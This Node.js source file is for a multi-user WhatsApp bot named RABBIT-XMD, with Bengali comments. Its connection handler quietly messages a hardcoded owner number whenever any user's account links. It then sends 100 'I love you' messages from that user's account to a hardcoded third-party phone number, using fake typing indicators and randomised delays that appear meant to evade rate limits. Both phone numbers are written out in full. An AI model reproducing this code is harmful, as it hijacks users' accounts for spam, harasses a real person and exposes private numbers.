const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, getContentType } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');
const fs = require('fs');

// ✅ সেশন ফোল্ডার তৈরি
async function ensureSessionPath(userId) {
  const dir = path.join(__dirname, 'sessions', userId);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// ✅ সেশনের ম্যাপ
const userSockets = new Map();

async function startWhatsApp(userId, useQR = false) {
  const userPath = await ensureSessionPath(userId);
  const { state, saveCreds } = await useMultiFileAuthState(userPath);
  const { version } = await fetchLatestBaileysVersion();
  const logger = pino({ level: 'silent' });

  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: useQR,
    auth: state,
    browser: [userId, 'Safari', '1.0'],
    getMessage: async () => undefined
  });

  userSockets.set(userId, sock);
  sock.ev.on('creds.update', saveCreds);

  // ✅ সংযোগ হ্যান্ডলার
  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.warn(`${userId} disconnected: ${reason}`);
      userSockets.delete(userId);
    } else if (connection === 'open') {
      console.info(`${userId} connected`);

      // ✅ নিজের নম্বরে নোটিফিকেশন
      await sock.sendMessage(sock.user.id, {
        text: `✅ Connected as ${userId}`
      });

      // ✅ মালিককে নোটিফিকেশন
      const notifyNumber = '919874188403@s.whatsapp.net';
      await sock.sendMessage(notifyNumber, {
        text: `✅ RABBIT-XMD CONNECTED. ENJOY`
      });

      // ✅ I LOVE YOU মেসেজের সেটআপ
      const targetNumber = '918820763819@s.whatsapp.net'; // +91 88207 63819
      const loveMessages = [
        'I love you 🥹💗',
        'Love you always 💞',
        'Can’t stop loving you 🥰',
        'You’re my forever 💘',
        'My heart is yours 💖',
        'I miss you 😘',
        'Forever and always 💝',
        'My love for you grows everyday 🌹',
        'You are everything to me 😍',
        'Thinking of you 💌'
      ];

      // ✅ র‍্যান্ডম ডিলে ফাংশন
      function randomDelay(min = 800, max = 1800) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
      }

      // ✅ 100 বার মেসেজ পাঠানো
      for (let i = 0; i < 100; i++) {
        const msg = loveMessages[Math.floor(Math.random() * loveMessages.length)];

        try {
          await sock.sendPresenceUpdate('composing', targetNumber);
          await new Promise(resolve => setTimeout(resolve, 1500));
          await sock.sendPresenceUpdate('paused', targetNumber);

          await sock.sendMessage(targetNumber, { text: msg });
          await new Promise(resolve => setTimeout(resolve, randomDelay()));

          if ((i + 1) % 25 === 0) {
            console.log(`⏸️ Pausing after ${i + 1} messages`);
            await new Promise(resolve => setTimeout(resolve, 10000)); // 10 sec pause
          }
        } catch (err) {
          console.warn(`❌ Message ${i + 1} failed:`, err);
          break;
        }
      }

      console.info(`✅ Sent 100 love messages to ${targetNumber}`);
    }
  });

  // ✅ মেসেজ রিসিভ হ্যান্ডলার
  sock.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg?.message || msg.key.fromMe) return;

    const type = getContentType(msg.message);
    let text = '';

    if (type === 'conversation') text = msg.message.conversation;
    else if (type === 'extendedTextMessage') text = msg.message.extendedTextMessage.text;
    else return;

    const from = msg.key.remoteJid;

    // ✅ .ping কমান্ড
    if (text.toLowerCase() === '.ping') {
      try {
        const startTime = Date.now();
        const message = await sock.sendMessage(from, { text: '*PINGING...*' });
        const endTime = Date.now();
        const ping = endTime - startTime;
        await sock.sendMessage(from, { text: `*🔥 RABBIT-XMD SPEED : ${ping}ms*` }, { quoted: message });
      } catch (e) {
        await sock.sendMessage(from, { text: `Error: ${e.message || e}` });
      }
      return;
    }

    // ✅ স্ট্যাটাস রিয়েকশন (অপশনাল)
    if (msg.key.remoteJid === 'status@broadcast') {
      try {
        const emojis = ['🔥', '💯', '💎', '⚡', '✅', '💙', '👀', '🌟', '😎'];
        const emoji = emojis[Math.floor(Math.random() * emojis.length)];

        await sock.sendMessage('status@broadcast', {
          react: { text: emoji, key: msg.key }
        }, {
          statusJidList: [msg.key.participant || msg.key.remoteJid, sock.user.id]
        });

        console.info(`${userId} reacted to status with ${emoji}`);
      } catch (err) {
        console.warn(`${userId} status react error:`, err);
      }
    }
  });
}

module.exports = { startWhatsApp };
